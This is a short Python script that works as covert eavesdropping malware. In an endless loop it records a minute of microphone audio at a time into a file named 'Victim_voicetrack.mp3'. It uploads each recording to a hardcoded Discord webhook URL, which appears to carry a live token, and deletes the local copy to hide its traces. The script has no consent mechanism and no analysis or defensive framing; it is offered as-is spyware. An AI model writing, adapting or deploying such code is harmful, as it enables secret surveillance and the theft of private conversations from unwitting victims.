import pyaudio
import requests
import time
import wave
import os

def send_to_discord(WAVE_OUTPUT_FILENAME):
    with open("Victim_voicetrack.mp3", "rb") as audio_file:
        url = "https://discord.com/api/webhooks/1412353107014320148/Tfankvkhkjv_KEBo5T2jBzFZU7nH4c4h_g4hkRKhHKZcLqSKG_PBb4Jw51byfBm4Ywgv"
        data = {"file": ("Victim_voicetrack.mp3", audio_file, "audio/mp3")}
        requests.post(url, files=data)

while True:
    audio = pyaudio.PyAudio()

    CHUNK = 2048
    FORMAT = pyaudio.paInt16
    CHANNELS = 2
    RATE = 8140
    RECORD_SECONDS = 60
    WAVE_OUTPUT_FILENAME = 'Victim_voicetrack.mp3'

    stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)

    RecordFrame = []

    for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
        data = stream.read(CHUNK)
        RecordFrame.append(data)

    stream.stop_stream()
    stream.close()
    audio.terminate()

    VF = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
    VF.setnchannels(CHANNELS)
    VF.setsampwidth(audio.get_sample_size(FORMAT))
    VF.setframerate(RATE)
    VF.writeframes(b''.join(RecordFrame))
    VF.close()
    send_to_discord(f'Victim_voicetrack.mp3')
    file_path = "Victim_voicetrack.mp3"
    os.remove(file_path)
